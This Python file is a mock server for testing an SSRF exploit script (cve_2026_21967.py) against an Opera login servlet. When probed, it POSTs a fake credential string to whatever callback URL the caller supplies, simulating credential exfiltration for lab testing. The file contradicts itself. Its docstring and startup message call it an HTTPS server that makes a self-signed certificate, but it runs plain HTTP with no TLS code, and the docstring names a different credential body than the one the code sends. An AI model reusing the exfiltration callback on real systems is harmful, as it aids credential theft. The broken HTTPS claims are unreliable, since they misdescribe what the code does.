"""
Mock internal HTTPS server for cve_2026_21967.py SSRF probing.

Simulates an internal service vulnerable to SSRF. When it receives a
probe at GET /OperaLogin/OperaServlet, it extracts the urladdress
parameter and makes a POST callback containing userid=admin (simulating
credential exfiltration from the internal network).

Usage (terminal 1, generates cert and starts mock):
    python examples/mock_ssrf_server.py --port 8000

Usage (terminal 2):
    python examples/cve_2026_21967.py --lhost localhost --target https://localhost:8000

Note: The mock generates a self-signed cert on first run. The cve_2026_21967
example uses httpx with verify=False so it will accept it.
"""

import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class OperaRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        urladdress = params.get("urladdress", [None])[0]

        print(f"[mock] GET {self.path} from {self.client_address[0]}")
        if urladdress:
            print(f"[mock] Extracted urladdress: {urladdress}")
            self._simulate_ssrf(urladdress)
        else:
            print(f"[mock] No urladdress param found")

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body>OK</body></html>")
        print(f"[mock] Responded 200 OK")

    def _simulate_ssrf(self, callback_url):
        """Simulate the SSRF by making a POST callback with credential data."""
        body = b"userid=OPERA/password123@opera"
        print(f"[mock] Simulating SSRF callback to {callback_url}")
        print(f"[mock] Callback body: {body.decode()}")
        try:
            req = urllib.request.Request(
                callback_url,
                data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=10)
            resp.read()  # drain
            print(f"[mock] SSRF callback sent successfully")
        except Exception as e:
            print(f"[mock] SSRF callback failed: {e}")

    def log_message(self, fmt, *args):
        pass


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Mock SSRF internal HTTPS server",
    )
    parser.add_argument("--port", type=int, default=8000, help="Listen port")
    parser.add_argument("--bind", default="0.0.0.0", help="Bind address")
    args = parser.parse_args()

    httpd = HTTPServer((args.bind, args.port), OperaRequestHandler)

    print(f"[mock] SSRF target listening on https://{args.bind}:{args.port}")
    print(f"[mock] Endpoint: GET /OperaLogin/OperaServlet?urladdress=...")
    print(f"[mock] Press Ctrl+C to stop")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print()
    finally:
        httpd.server_close()
        print("[mock] Stopped")


if __name__ == "__main__":
    main()
